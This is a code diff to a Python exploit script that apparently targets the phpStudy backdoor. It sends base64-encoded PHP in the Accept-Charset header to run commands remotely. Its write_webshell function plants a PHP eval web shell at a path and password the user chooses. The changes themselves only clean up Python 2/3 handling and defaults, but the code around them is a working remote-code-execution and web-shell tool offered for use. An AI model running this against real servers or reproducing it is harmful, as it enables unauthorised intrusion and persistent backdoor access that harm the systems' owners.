@@ -1,22 +1,25 @@
 import requests
 import sys
+import base64
 
 if sys.version[0] == '2':
-    b64 = lambda s: s.encode('base64')[:-1]
     input = raw_input
-else:
-    _b64 = __import__('base64').b64encode
-    b64 = lambda s: _b64(s.encode())
+
+b64 = lambda s: base64.b64encode(s.encode())
 
 
 def rce(url, c):
     h = {
-        'Accept-Charset': b64(c),
+        'Accept-Charset': b64(c).replace('/', '%2F'),
         'Accept-Encoding': 'gzip,deflate',
         'User-Agent': 'Mozilla/5.0 Firefox/68.0',
     }
     r = requests.get(url, headers=h, timeout=20)
-    return r.text
+
+    if sys.version[0] == '3':
+        return r.text
+    else:
+        return r.content
 
 
 def check_vuln(url):
@@ -39,7 +42,6 @@ def command(url, c):
 def write_webshell(url, fname, pwd):
     write_cmd = ('file_put_contents(\'{}\', '
                  '\'<?php @eval($_REQUEST[{}]); ?>\');'.format(fname, pwd))
-    print(write_cmd)
     rce(url, write_cmd)
 
 
@@ -71,12 +73,12 @@ try:
             print(command(url, cmd))
 
     elif subcommand == 'shell':
-        file = input('input shell name with absolutely path: '
-                     ) or 'C:\\\\phpstudy\\\\phptutorial\\\\418.php'
+        file = input('input shell name with absolutely path: ')
         pwd = input('input shell password (default \'pass\'): ') or 'pass'
         write_webshell(url, file, pwd)
         print('[+]path: {}   password: {}'.format(file, pwd))
     else:
         banner()
+
 except Exception as e:
     print('[!]%s' % e)
